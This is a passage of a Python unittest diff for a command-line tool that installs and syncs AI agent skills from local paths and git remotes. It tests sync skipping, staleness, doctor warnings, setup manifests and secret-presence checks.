+        self.src = self.tool.root / "sources"
+        (self.src / "local-skill").mkdir(parents=True)
+        (self.src / "local-skill" / "SKILL.md").write_text("# local-skill\n")
+        (self.src / "sql-review.md").write_text("# sql-review\n")
+
+        self.repo = TempGitRepo(self.tool.root, name="agentics")
+        self.repo.commit("skills/from-git/SKILL.md", "# from-git v1\n")
+        self.repo.push()
+
+        install_local_only_fixture(self.tool, f"""\
+library:
+  skills:
+    - name: local-skill
+      description: From a path on this machine
+      source: {self.src}/local-skill/SKILL.md
+    - name: from-git
+      description: From a git remote
+      source: {self.REMOTE_SOURCE}
+  agents:
+    - name: sql-review
+      description: A single-file entry
+      source: {self.src}/sql-review.md
+  prompts: []
+""")
+
+    @contextlib.contextmanager
+    def local_remote(self):
+        """Point every clone/ls-remote at the local bare repo — no network (R18.6)."""
+        remote = str(self.repo.remote)
+        with patch.object(library.Source, "clone_urls", lambda _self: [remote]):
+            yield
+
+    @contextlib.contextmanager
+    def counted_clones(self) -> Any:
+        """Count real fetches, so "skipped" means "did not clone", not "looked fast"."""
+        calls: list[str] = []
+        real = library.fetch_remote
+
+        def counting(src, entry, target_base, clones=None):
+            calls.append(entry.name)
+            return real(src, entry, target_base, clones)
+
+        with patch.object(library, "fetch_remote", counting):
+            yield calls
+
+    def use(self, name: str) -> None:
+        with self.local_remote():
+            code, _, err = run_cli("use", name, "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+
+    def sync(self, *extra: str) -> dict[str, Any]:
+        with self.local_remote():
+            code, out, err = run_cli("sync", *extra, "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+        return json.loads(out)
+
+    def test_an_unchanged_remote_item_is_not_cloned_again(self) -> None:
+        self.use("from-git")
+        with self.counted_clones() as calls:
+            payload = self.sync()
+        self.assertEqual(calls, [], "sync cloned a repo whose head hasn't moved")
+        self.assertTrue(payload["synced"][0]["up_to_date"])
+
+    def test_a_moved_head_is_refreshed(self) -> None:
+        self.use("from-git")
+        self.repo.commit("skills/from-git/SKILL.md", "# from-git v2\n")
+        self.repo.push()
+        with self.counted_clones() as calls:
+            payload = self.sync()
+        self.assertEqual(calls, ["from-git"])
+        self.assertFalse(payload["synced"][0]["up_to_date"])
+        self.assertEqual(payload["synced"][0]["changes"]["modified"], ["SKILL.md"])
+
+    def test_force_refetches_an_unchanged_item(self) -> None:
+        self.use("from-git")
+        with self.counted_clones() as calls:
+            payload = self.sync("--force")
+        self.assertEqual(calls, ["from-git"])
+        self.assertFalse(payload["synced"][0]["up_to_date"])
+
+    def test_a_drifted_copy_is_refreshed_even_when_the_source_is_unchanged(self) -> None:
+        # Skipping here would leave the local edit in place and report "up to date",
+        # which is the one answer that would be a lie.
+        self.use("from-git")
+        (self.tool.home / ".claude/skills/from-git/SKILL.md").write_text("# edited\n")
+        with self.counted_clones() as calls:
+            payload = self.sync()
+        self.assertEqual(calls, ["from-git"])
+        self.assertEqual(payload["synced"][0]["state"], "drifted")
+
+    def test_an_untracked_copy_is_refreshed(self) -> None:
+        dest = self.tool.home / ".claude/skills/from-git"
+        dest.mkdir(parents=True)
+        (dest / "SKILL.md").write_text("# hand written\n")
+        with self.counted_clones() as calls:
+            self.sync()
+        self.assertEqual(calls, ["from-git"], "a copy with no receipt cannot be assumed current")
+
+    def test_an_unreachable_remote_falls_back_to_fetching(self) -> None:
+        # "Don't know" must never read as "unchanged", or one network blip stops updates.
+        self.use("from-git")
+        with patch.object(library, "remote_head", lambda src, cache: None), \
+                self.counted_clones() as calls:
+            self.sync()
+        self.assertEqual(calls, ["from-git"])
+
+    def test_one_ls_remote_per_repo_not_per_entry(self) -> None:
+        cache: dict[str, Any] = {}
+        src = library.parse_source(self.REMOTE_SOURCE)
+        runs: list[list[str]] = []
+        real = library.subprocess.run
+
+        def counting(cmd, *a, **kw):
+            if cmd[:2] == ["git", "ls-remote"]:
+                runs.append(cmd)
+            return real(cmd, *a, **kw)
+
+        with self.local_remote(), patch.object(library.subprocess, "run", counting):
+            for _ in range(3):
+                library.remote_head(src, cache)
+        self.assertEqual(len(runs), 1, runs)
+
+    def test_an_unchanged_local_source_is_skipped(self) -> None:
+        self.use("local-skill")
+        self.assertTrue(self.sync()["synced"][0]["up_to_date"])
+
+    def test_an_edited_local_source_is_refreshed(self) -> None:
+        self.use("local-skill")
+        (self.src / "local-skill" / "SKILL.md").write_text("# local-skill v2\n")
+        synced = self.sync()["synced"][0]
+        self.assertFalse(synced["up_to_date"])
+        self.assertEqual(synced["changes"]["modified"], ["SKILL.md"])
+
+    def test_a_single_file_local_entry_compares_bytes(self) -> None:
+        # Its dest is renamed to <name>.md, so a tree hash would never match; the file
+        # comparison is what makes skipping possible here at all.
+        self.use("sql-review")
+        self.assertTrue(self.sync()["synced"][0]["up_to_date"])
+        (self.src / "sql-review.md").write_text("# sql-review v2\n")
+        self.assertFalse(self.sync()["synced"][0]["up_to_date"])
+
+    def test_a_vanished_local_source_still_reports_the_failure(self) -> None:
+        self.use("local-skill")
+        shutil.rmtree(self.src / "local-skill")
+        code, out, _ = run_cli("sync", "--no-pull", "--json")
+        self.assertEqual(code, 1)
+        self.assertEqual([f["name"] for f in json.loads(out)["failed"]], ["local-skill"])
+
+    def test_the_human_output_says_up_to_date(self) -> None:
+        self.use("local-skill")
+        code, out, err = run_cli("sync", "--no-pull")
+        self.assertEqual(code, 0, err)
+        self.assertIn("up to date [skill] local-skill (global)", out)
+        self.assertIn("0 changed", out)
+
+
+class TestListCheckRemote(unittest.TestCase):
+    """Opt-in staleness against the source (design §3.1, C-D5)."""
+
+    REMOTE_SOURCE = "https://github.com/acme/agentics/blob/main/skills/from-git/SKILL.md"
+
+    def setUp(self) -> None:
+        self.tool = TempTool()
+        self.addCleanup(self.tool.stop)
+        self.src = self.tool.root / "sources"
+        (self.src / "local-skill").mkdir(parents=True)
+        (self.src / "local-skill" / "SKILL.md").write_text("# local-skill\n")
+        self.repo = TempGitRepo(self.tool.root, name="agentics")
+        self.repo.commit("skills/from-git/SKILL.md", "# from-git v1\n")
+        self.repo.push()
+        install_local_only_fixture(self.tool, f"""\
+library:
+  skills:
+    - name: from-git
+      description: From a git remote
+      source: {self.REMOTE_SOURCE}
+    - name: local-skill
+      description: From a path on this machine
+      source: {self.src}/local-skill/SKILL.md
+  agents: []
+  prompts: []
+""")
+
+    @contextlib.contextmanager
+    def local_remote(self):
+        remote = str(self.repo.remote)
+        with patch.object(library.Source, "clone_urls", lambda _self: [remote]):
+            yield
+
+    def use(self, name: str) -> None:
+        with self.local_remote():
+            code, _, err = run_cli("use", name, "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+
+    def rows(self, *extra: str) -> dict[str, dict[str, Any]]:
+        with self.local_remote():
+            code, out, err = run_cli("list", *extra, "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+        return {i["name"]: i for i in json.loads(out)}
+
+    def test_a_plain_list_makes_no_network_call(self) -> None:
+        # C-D5: a read command that silently hits the network hangs on a plane.
+        self.use("from-git")
+        self.repo.commit("skills/from-git/SKILL.md", "# from-git v2\n")
+        self.repo.push()
+        calls: list[Any] = []
+        with patch.object(library, "remote_head",
+                          lambda src, cache: calls.append(src) or "deadbeef"):
+            rows = self.rows()
+        self.assertEqual(calls, [])
+        self.assertEqual(rows["from-git"]["state"], "installed")
+
+    def test_check_remote_marks_a_behind_install_stale(self) -> None:
+        self.use("from-git")
+        self.repo.commit("skills/from-git/SKILL.md", "# from-git v2\n")
+        self.repo.push()
+        self.assertEqual(self.rows("--check-remote")["from-git"]["state"], "stale")
+
+    def test_check_remote_leaves_a_current_install_installed(self) -> None:
+        self.use("from-git")
+        self.assertEqual(self.rows("--check-remote")["from-git"]["state"], "installed")
+
+    def test_a_local_source_is_never_stale(self) -> None:
+        # There is no head to be behind; sync compares trees for these instead.
+        self.use("local-skill")
+        self.assertEqual(self.rows("--check-remote")["local-skill"]["state"], "installed")
+
+    def test_drift_outranks_staleness(self) -> None:
+        self.use("from-git")
+        (self.tool.home / ".claude/skills/from-git/SKILL.md").write_text("# edited\n")
+        self.repo.commit("skills/from-git/SKILL.md", "# from-git v2\n")
+        self.repo.push()
+        self.assertEqual(self.rows("--check-remote")["from-git"]["state"], "drifted")
+
+    def test_an_unreachable_remote_leaves_the_state_alone(self) -> None:
+        self.use("from-git")
+        with patch.object(library, "remote_head", lambda src, cache: None):
+            rows = self.rows("--check-remote")
+        self.assertEqual(rows["from-git"]["state"], "installed")
+
+    def test_the_human_output_says_stale(self) -> None:
+        self.use("from-git")
+        self.repo.commit("skills/from-git/SKILL.md", "# from-git v2\n")
+        self.repo.push()
+        with self.local_remote():
+            code, out, err = run_cli("list", "--check-remote", "--no-pull")
+        self.assertEqual(code, 0, err)
+        self.assertIn("stale (global)", out)
+
+
+class TestDoctorInstallHealth(unittest.TestCase):
+    """doctor validates setup manifests and reports install drift (design §4.5)."""
+
+    def setUp(self) -> None:
+        self.tool = TempTool()
+        self.addCleanup(self.tool.stop)
+        self.src = self.tool.root / "sources"
+        for name in ("alpha", "beta"):
+            (self.src / name).mkdir(parents=True)
+            (self.src / name / "SKILL.md").write_text(f"# {name}\n")
+        install_local_only_fixture(self.tool, f"""\
+library:
+  skills:
+    - name: alpha
+      description: First
+      source: {self.src}/alpha/SKILL.md
+    - name: beta
+      description: Second
+      source: {self.src}/beta/SKILL.md
+  agents: []
+  prompts: []
+""")
+
+    def install(self, name: str) -> Path:
+        code, _, err = run_cli("use", name, "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+        return self.tool.home / ".claude/skills" / name
+
+    def doctor(self) -> dict[str, Any]:
+        with stubbed_gh():
+            code, out, err = run_cli("doctor", "--no-pull", "--json")
+        self.assertIn(code, (0, 1), err)
+        return json.loads(out)
+
+    def messages(self, payload: dict[str, Any], key: str) -> list[str]:
+        return [f["message"] for f in payload[key]]
+
+    def test_a_clean_tree_produces_no_install_findings(self) -> None:
+        self.install("alpha")
+        payload = self.doctor()
+        for message in self.messages(payload, "warnings") + self.messages(payload, "errors"):
+            self.assertNotIn("installed copy", message)
+            self.assertNotIn("setup.yaml", message)
+
+    def test_a_non_canonical_manifest_warns_and_never_errors(self) -> None:
+        # §11's separation, end to end: doctor still exits 0 and the walkthrough is
+        # untouched. A field-order nit must never take a skill's setup offline.
+        dest = self.install("alpha")
+        (dest / "setup.yaml").write_text(yaml.safe_dump(setup_manifest(secrets=[
+            {"key": "k", "label": "L", "delivery": "config-file",
+             "optional": True, "env_override": "TOKEN"}])))
+
+        payload = self.doctor()
+
+        self.assertEqual(payload["status"], "OK")
+        self.assertTrue(any("canonical order" in w for w in self.messages(payload, "warnings")),
+                        payload["warnings"])
+        self.assertEqual(
+            [e for e in self.messages(payload, "errors") if "setup.yaml" in e], [])
+
+    def test_an_invalid_manifest_still_errors(self) -> None:
+        # The other side of the same separation: validity is not a convention.
+        dest = self.install("alpha")
+        (dest / "setup.yaml").write_text(yaml.safe_dump(setup_manifest(verify="check")))
+
+        payload = self.doctor()
+
+        self.assertEqual(payload["status"], "PROBLEMS")
+        self.assertTrue(any("was removed from the schema" in e
+                            for e in self.messages(payload, "errors")), payload["errors"])
+
+    def test_a_drifted_install_warns(self) -> None:
+        dest = self.install("alpha")
+        (dest / "SKILL.md").write_text("# edited by hand\n")
+        warnings = self.messages(self.doctor(), "warnings")
+        self.assertTrue(any("local modifications" in w for w in warnings), warnings)
+
+    def test_an_untracked_install_warns(self) -> None:
+        dest = self.tool.home / ".claude/skills/beta"
+        dest.mkdir(parents=True)
+        (dest / "SKILL.md").write_text("# hand written\n")
+        warnings = self.messages(self.doctor(), "warnings")
+        self.assertTrue(any("no install receipt" in w for w in warnings), warnings)
+
+    def test_a_receipt_whose_files_are_gone_warns(self) -> None:
+        dest = self.install("alpha")
+        shutil.rmtree(dest)
+        warnings = self.messages(self.doctor(), "warnings")
+        self.assertTrue(any("no longer exists" in w for w in warnings), warnings)
+
+    def test_an_invalid_setup_manifest_is_an_error(self) -> None:
+        dest = self.install("alpha")
+        (dest / "setup.yaml").write_text(yaml.safe_dump(setup_manifest(version=99)))
+        payload = self.doctor()
+        errors = self.messages(payload, "errors")
+        self.assertTrue(any("invalid setup.yaml" in e and "unknown setup version" in e
+                            for e in errors), errors)
+        self.assertEqual(payload["status"], "PROBLEMS")
+
+    def test_a_valid_setup_manifest_is_not_flagged(self) -> None:
+        dest = self.install("alpha")
+        (dest / "setup.yaml").write_text(yaml.safe_dump(setup_manifest()))
+        self.assertEqual([e for e in self.messages(self.doctor(), "errors")
+                          if "setup.yaml" in e], [])
+
+    def test_both_findings_are_reported_from_one_run(self) -> None:
+        drifted = self.install("alpha")
+        (drifted / "SKILL.md").write_text("# edited\n")
+        broken = self.install("beta")
+        (broken / "setup.yaml").write_text(yaml.safe_dump(setup_manifest(verify="nope")))
+        payload = self.doctor()
+        self.assertTrue(any("local modifications" in w for w in self.messages(payload, "warnings")))
+        self.assertTrue(any("invalid setup.yaml" in e for e in self.messages(payload, "errors")))
+
+
+class TestSetupCommand(unittest.TestCase):
+    """`library setup <name>`: the manifest plus per-prerequisite state (design §4.5)."""
+
+    def setUp(self) -> None:
+        self.tool = TempTool()
+        self.addCleanup(self.tool.stop)
+        self.src = self.tool.root / "sources"
+        for name in ("toolkit", "sibling", "plain"):
+            (self.src / name).mkdir(parents=True)
+            (self.src / name / "SKILL.md").write_text(f"# {name}\n")
+        install_local_only_fixture(self.tool, f"""\
+library:
+  skills:
+    - name: toolkit
+      description: Needs credentials
+      source: {self.src}/toolkit/SKILL.md
+    - name: sibling
+      description: A sibling skill
+      source: {self.src}/sibling/SKILL.md
+    - name: plain
+      description: No setup at all
+      source: {self.src}/plain/SKILL.md
+  agents: []
+  prompts: []
+""")
+
+    def install(self, name: str) -> Path:
+        code, _, err = run_cli("use", name, "--no-pull", "--json")
+        self.assertEqual(code, 0, err)
+        return self.tool.home / ".claude/skills" / name
+
+    def write_manifest(self, dest: Path, **overrides: Any) -> None:
+        (dest / "setup.yaml").write_text(yaml.safe_dump(setup_manifest(**overrides)))
+
+    def setup(self, name: str, *extra: str, expect: int = 0) -> dict[str, Any]:
+        code, out, err = run_cli("setup", name, *extra, "--no-pull", "--json")
+        self.assertEqual(code, expect, err or out)
+        return json.loads(out)
+
+    def test_a_skill_with_no_manifest_is_not_an_error(self) -> None:
+        self.install("plain")
+        payload = self.setup("plain")
+        self.assertEqual((payload["status"], payload["has_setup"], payload["manifest"]),
+                         ("OK", False, None))
+        self.assertEqual(payload["problems"], [])
+
+    def test_an_uninstalled_skill_reports_nothing_to_set_up(self) -> None:
+        payload = self.setup("toolkit")
+        self.assertEqual((payload["installed"], payload["has_setup"], payload["dest"]),
+                         (False, False, None))
+
+    def test_a_valid_manifest_comes_back_whole(self) -> None:
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[], config={}, secrets=[],
+                            commands={"check": {"run": "bin/check.mjs"}})
+        payload = self.setup("toolkit")
+        self.assertTrue(payload["has_setup"])
+        self.assertEqual(list(payload["manifest"]["commands"]), ["check"])
+        self.assertEqual(payload["dest"], str(dest))
+        self.assertTrue(payload["ready"])
+
+    def test_an_invalid_manifest_is_reported_and_never_ready(self) -> None:
+        dest = self.install("toolkit")
+        # A `config-file` secret with no `config-init` command to create the file: the
+        # rule the reserved id makes checkable.
+        self.write_manifest(dest, commands={"check": {"run": "bin/check.mjs"}})
+        payload = self.setup("toolkit")
+        self.assertTrue(any("'config-init' command is required" in p
+                            for p in payload["problems"]), payload["problems"])
+        self.assertFalse(payload["ready"])
+
+    def test_a_sibling_skill_prerequisite_reads_what_is_installed(self) -> None:
+        # The reason this lives in Python at all: answering it means knowing what's
+        # installed, which is receipts (C-D7).
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[{"sibling-skill": "sibling"}],
+                            config={}, secrets=[],
+                            commands={"check": {"run": "bin/check.mjs"}})
+        unmet = self.setup("toolkit")["prerequisites"][0]
+        self.assertEqual((unmet["kind"], unmet["met"], unmet["detail"]),
+                         ("sibling-skill", False, "not installed"))
+        self.install("sibling")
+        met = self.setup("toolkit")["prerequisites"][0]
+        self.assertTrue(met["met"])
+        self.assertIn("global", met["detail"])
+
+    def test_an_env_prerequisite_reads_the_environment(self) -> None:
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[{"env": "LIBRARY_TEST_ENV_PREREQ"}],
+                            config={}, secrets=[],
+                            commands={"check": {"run": "bin/check.mjs"}})
+        self.assertFalse(self.setup("toolkit")["prerequisites"][0]["met"])
+        with patch.dict(os.environ, {"LIBRARY_TEST_ENV_PREREQ": "/tmp/cycle.json"}):
+            self.assertTrue(self.setup("toolkit")["prerequisites"][0]["met"])
+
+    def test_a_binary_prerequisite_reads_the_path(self) -> None:
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[{"binary": "git"}, {"binary": "definitely-not-a-binary"}],
+                            config={}, secrets=[],
+                            commands={"check": {"run": "bin/check.mjs"}})
+        met, unmet = self.setup("toolkit")["prerequisites"]
+        self.assertTrue(met["met"])
+        self.assertEqual((unmet["met"], unmet["detail"]), (False, "not on PATH"))
+
+    def test_a_node_prerequisite_compares_versions(self) -> None:
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[{"node": ">=20"}], config={}, secrets=[],
+                            commands={"check": {"run": "bin/check.mjs"}})
+        with patch.object(library, "_node_version", lambda: "v22.19.0"):
+            self.assertTrue(self.setup("toolkit")["prerequisites"][0]["met"])
+        with patch.object(library, "_node_version", lambda: "v18.4.0"):
+            self.assertFalse(self.setup("toolkit")["prerequisites"][0]["met"])
+        with patch.object(library, "_node_version", lambda: None):
+            miss = self.setup("toolkit")["prerequisites"][0]
+        self.assertEqual((miss["met"], miss["detail"]), (False, "node not on PATH"))
+
+    def test_an_unmet_prerequisite_blocks_ready_even_on_a_valid_manifest(self) -> None:
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[{"sibling-skill": "sibling"}],
+                            config={}, secrets=[],
+                            commands={"check": {"run": "bin/check.mjs"}})
+        payload = self.setup("toolkit")
+        self.assertEqual(payload["problems"], [])
+        self.assertFalse(payload["ready"])
+
+    def test_scaffold_prints_a_canonical_skeleton_without_touching_disk(self) -> None:
+        # Printed, not written: the manifest belongs in the skill's *source* repo, which
+        # for a remote catalog is not on this machine at all. Redirecting is one keystroke
+        # and cannot clobber a file the author already has.
+        before = sorted(p.name for p in (self.tool.home / ".claude/skills").rglob("*")) \
+            if (self.tool.home / ".claude/skills").exists() else []
+
+        code, out, err = run_cli("setup", "toolkit", "--scaffold", "--no-pull")
+
+        self.assertEqual(code, 0, err)
+        data = yaml.safe_load(out)
+        self.assertEqual(library.validate_setup(data), [])
+        self.assertEqual(library.lint_setup(data), [])
+        self.assertIn("toolkit", data["summary"])
+        after = sorted(p.name for p in (self.tool.home / ".claude/skills").rglob("*")) \
+            if (self.tool.home / ".claude/skills").exists() else []
+        self.assertEqual(before, after)
+
+    def test_scaffold_needs_no_installed_copy_or_catalog_entry(self) -> None:
+        # Authoring a manifest happens before the skill is installed anywhere, so the
+        # template cannot depend on resolving the entry.
+        code, out, err = run_cli("setup", "not-in-any-catalog", "--scaffold", "--no-pull")
+
+        self.assertEqual(code, 0, err)
+        self.assertEqual(library.lint_setup(yaml.safe_load(out)), [])
+
+    def test_an_unknown_name_reports_not_found(self) -> None:
+        self.assertEqual(self.setup("nope", expect=2)["status"], "NOT_FOUND")
+
+    # --- `configured`: whether the declared values are already on disk ---------------
+    #
+    # A different question from `ready`, which says only that the walkthrough *can start*.
+    # Without this, a skill set up months ago still reports exactly what it reports on the
+    # day it was installed.
+
+    def write_config(self, data: dict[str, Any]) -> Path:
+        """Write the config file `VALID_SETUP` points at, under the temp HOME."""
+        path = Path(os.path.expanduser("~/.config/toolkit/config.json"))
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(json.dumps(data))
+        return path
+
+    def test_a_secret_that_is_not_stored_yet_is_missing_and_not_configured(self) -> None:
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[])
+        payload = self.setup("toolkit")
+
+        secret = payload["secrets"][0]
+        self.assertEqual((secret["key"], secret["present"]), ("account.api_token", False))
+        self.assertIn("has not been created yet", secret["detail"])
+        self.assertIs(payload["configured"], False)
+        # Independent of `ready`: nothing is stopping the walkthrough from starting, which
+        # is precisely the point of asking both questions.
+        self.assertTrue(payload["ready"])
+
+    def test_a_stored_secret_reads_back_as_configured(self) -> None:
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[])
+        path = self.write_config({"account": {"api_token": "atl-abc123"}})
+
+        payload = self.setup("toolkit")
+
+        secret = payload["secrets"][0]
+        self.assertEqual((secret["present"], secret["detail"]), (True, f"set in {path}"))
+        self.assertIs(payload["configured"], True)
+        # The value itself never leaves the file: the report says a value is there, never
+        # what it is.
+        self.assertNotIn("atl-abc123", json.dumps(payload))
+
+    def test_an_empty_string_is_not_a_stored_value(self) -> None:
+        # What a scaffold command writes: the shape is right and the credential is not
+        # there. Counting it as present is the one way this check can actively mislead.
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[])
+        self.write_config({"account": {"api_token": "   "}})
+
+        payload = self.setup("toolkit")
+
+        self.assertIs(payload["secrets"][0]["present"], False)
+        self.assertIs(payload["configured"], False)
+
+    def test_an_optional_secret_does_not_hold_back_configured(self) -> None:
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[], secrets=[
+            {"key": "account.api_token", "delivery": "config-file"},
+            {"key": "account.extra", "delivery": "config-file", "optional": True},
+        ])
+        self.write_config({"account": {"api_token": "atl-abc123"}})
+
+        payload = self.setup("toolkit")
+
+        self.assertEqual([s["present"] for s in payload["secrets"]], [True, False])
+        self.assertIs(payload["configured"], True)
+
+    def test_env_and_manual_secrets_are_unknowable_rather_than_missing(self) -> None:
+        # `env` persists nothing by definition and `manual` never reaches the app, so
+        # `false` would be an accusation. With nothing checkable, `configured` is null —
+        # which is an answer, not a failure to give one.
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[], secrets=[
+            {"key": "TOKEN", "delivery": "env"},
+            {"key": "account.hand_typed", "delivery": "manual"},
+        ])
+
+        payload = self.setup("toolkit")
+
+        self.assertEqual([s["present"] for s in payload["secrets"]], [None, None])
+        self.assertIsNone(payload["configured"])
+
+    def test_a_mixed_manifest_answers_for_the_half_it_can_see(self) -> None:
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[], secrets=[
+            {"key": "account.api_token", "delivery": "config-file"},
+            {"key": "TOKEN", "delivery": "env"},
+        ])
+        self.write_config({"account": {"api_token": "atl-abc123"}})
+
+        payload = self.setup("toolkit")
+
+        # True on the strength of the checkable one alone. It does not promise the env
+        # half is done — the app has to word it as "the values it saves are in place".
+        self.assertIs(payload["configured"], True)
+
+    def test_a_config_in_a_shape_nothing_parses_is_unknown_rather_than_missing(self) -> None:
+        # The format is detected, never declared, so a config the scaffold wrote in some
+        # other shape is simply one this build cannot read. Reporting its values missing
+        # would send you to add them to a file the app could not store them in either.
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[],
+                            config={"path": "~/.config/toolkit/config.ini"})
+        path = Path(os.path.expanduser("~/.config/toolkit/config.ini"))
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text("[account]\napi_token = atl-abc123\n")
+
+        payload = self.setup("toolkit")
+
+        self.assertIsNone(payload["secrets"][0]["present"])
+        self.assertIn("not JSON", payload["secrets"][0]["detail"])
+        self.assertIsNone(payload["configured"])
+
+    def test_an_unreadable_config_file_is_unknown_rather_than_missing(self) -> None:
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[])
+        path = Path(os.path.expanduser("~/.config/toolkit/config.json"))
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text("{ not json")
+
+        payload = self.setup("toolkit")
+
+        # The file is there and broken. "Not set" would send you to add a value to a file
+        # that will not load, which is the wrong fix.
+        self.assertIsNone(payload["secrets"][0]["present"])
+        self.assertIn("not JSON", payload["secrets"][0]["detail"])
+
+    def test_a_manifest_with_no_secrets_has_nothing_to_be_configured(self) -> None:
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[], config={}, secrets=[],
+                            commands={"check": {"run": "bin/check.mjs"}})
+
+        payload = self.setup("toolkit")
+
+        self.assertEqual(payload["secrets"], [])
+        self.assertIsNone(payload["configured"])
+
+    def test_the_human_output_lists_prerequisites_and_readiness(self) -> None:
+        dest = self.install("toolkit")
+        self.write_manifest(dest, prerequisites=[{"binary": "git"}])
+        code, out, err = run_cli("setup", "toolkit", "--no-pull")
+        self.assertEqual(code, 0, err)
+        self.assertIn("[ok  ] binary: git", out)
+        self.assertIn("account.api_token via config-file", out)
+        self.assertIn("Ready: yes", out)
+
+
+class TestVersionSatisfies(unittest.TestCase):
+    def test_ranges_it_understands(self) -> None:
+        for have, want, expected in (("v22.19.0", ">=20", True), ("v18.4.0", ">=20", False),
+                                     ("20.0.0", ">=20", True), ("v20.1.0", ">20.0", True),
+                                     ("v20.0.0", ">20", False), ("v18.0.0", "<20", True),
+                                     ("v20.0.0", "<=20", True), ("v20.1.0", "==20.1", True),
+                                     ("v22.1.0", "20", True)):
+            with self.subTest(have=have, want=want):
+                self.assertEqual(library._version_satisfies(have, want), expected)
+
+    def test_a_range_it_cannot_parse_returns_none_rather_than_guessing(self) -> None:
+        # Reported as "couldn't check", never as a pass — the schema permits ranges this
+        # deliberately small comparator doesn't cover.
+        for want in ("^20", "~20.1", ">=20 <23", "latest", ""):
+            with self.subTest(want=want):
+                self.assertIsNone(library._version_satisfies("v22.0.0", want))
+
+
+class TestInitIsAtomic(unittest.TestCase):
+    """A failed `init` must leave no config behind (R4.6 / desktop design §3.8a)."""
+
+    def setUp(self) -> None:
+        self.tool = TempTool()
+        self.addCleanup(self.tool.stop)
+
+    def working_repo(self) -> str:
+        repo = TempGitRepo(self.tool.root, name="upstream")
+        repo.commit("library.yaml", GOLDEN_CATALOG_NO_DIRS)
+        repo.push()
+        return str(repo.remote)
+
+    def test_a_clone_failure_leaves_no_config_so_a_retry_is_possible(self) -> None:
+        # The config is written before the clone is attempted, so without a rollback a
+        # typo'd URL strands the caller: every later init refuses with "already exists".
+        code, _, err = run_cli("init", "--repo", str(self.tool.root / "nope.git"),
+                               "--branch", "main")
+        self.assertEqual(code, 1, err)
+        self.assertFalse(self.tool.config_path.exists(),
+                         "a failed init must not leave a config pointing at a bad repo")
+
+    def test_a_retry_after_a_failure_needs_no_force(self) -> None:
+        run_cli("init", "--repo", str(self.tool.root / "nope.git"), "--branch", "main")
+        code, _, err = run_cli("init", "--repo", self.working_repo(), "--branch", "main")
+        self.assertEqual(code, 0, err)
+        self.assertTrue(self.tool.config_path.exists())
+
+    def test_a_failed_reinit_restores_the_config_it_was_replacing(self) -> None:
+        run_cli("init", "--repo", self.working_repo(), "--branch", "main")
+        before = self.tool.config_path.read_text()
+
+        code, _, _ = run_cli("init", "--repo", str(self.tool.root / "nope.git"),
+                             "--branch", "main", "--force")
+
+        self.assertEqual(code, 1)
+        self.assertEqual(self.tool.config_path.read_text(), before,
+                         "a failed --force init must not destroy the working config")
+
+
+class TestShow(unittest.TestCase):
+    """One entry in full: winner, every copy, deps, installs, source (design §4.2)."""
+
+    def setUp(self) -> None:
+        self.tool = TempTool()
+        self.addCleanup(self.tool.stop)
+        self.src = self.tool.root / "sources"
+        for name in ("session-retro", "own-dep"):
+            (self.src / name).mkdir(parents=True)
+            (self.src / name / "SKILL.md").write_text(f"# {name}\n")
+        personal = f"""\
+library:
+  skills:
+    - name: session-retro
+      description: My iterated copy
+      source: {self.src}/session-retro/SKILL.md
+      requires: ["skill:own-dep"]
+    - name: own-dep
+      description: A dependency in the same catalog
+      source: {self.src}/own-dep/SKILL.md
+  agents: []
+  prompts: []
+"""
+        install_two_catalog_fixture(self.tool, personal)
+
+    def show(self, name: str, *extra: str, expect: int = 0) -> dict[str, Any]:
+        code, out, err = run_cli("show", name, *extra, "--no-pull", "--json")
+        self.assertEqual(code, expect, err or out)
+        return json.loads(out)
+
+    def test_reports_every_copy_and_which_one_wins(self) -> None:
+        payload = self.show("session-retro")
+        self.assertEqual([c["catalog"] for c in payload["copies"]], ["personal", "shared"])
+        self.assertEqual([c["wins"] for c in payload["copies"]], [True, False])
+        self.assertEqual(payload["entry"]["catalog"], "personal")
+
+    def test_the_override_chain_reads_in_both_directions(self) -> None:
+        copies = {c["catalog"]: c for c in self.show("session-retro")["copies"]}
+        self.assertEqual((copies["personal"]["overrides"], copies["personal"]["overridden_by"]),
+                         (["shared"], []))
+        self.assertEqual((copies["shared"]["overrides"], copies["shared"]["overridden_by"]),
+                         ([], ["personal"]))
+
+    def test_requires_resolve_within_the_winners_catalog(self) -> None:
+        self.assertEqual([d["name"] for d in self.show("session-retro")["requires"]],
+                         ["own-dep"])
+
+    def test_a_healthy_entry_reports_nothing_unresolved(self) -> None:
+        self.assertEqual(self.show("session-retro")["unresolved_requires"], [])
+
+    def test_a_dependency_no_catalog_defines_is_reported_not_dropped(self) -> None:
+        # Without this the payload just gets shorter, which reads as "nothing missing"
+        # to any caller that cannot see the stderr warning.
+        path = self.tool.root / "personal" / "library.yaml"
+        path.write_text(path.read_text().replace('["skill:own-dep"]',
+                                                 '["skill:own-dep", "skill:ghost"]'))
+        payload = self.show("session-retro")
+
+        self.assertEqual([d["name"] for d in payload["requires"]], ["own-dep"])
+        self.assertEqual(payload["unresolved_requires"],
+                         [{"ref": "skill:ghost", "required_by": "session-retro",
+                           "reason": "not_found"}])
+
+    def test_the_entry_record_matches_lists(self) -> None:
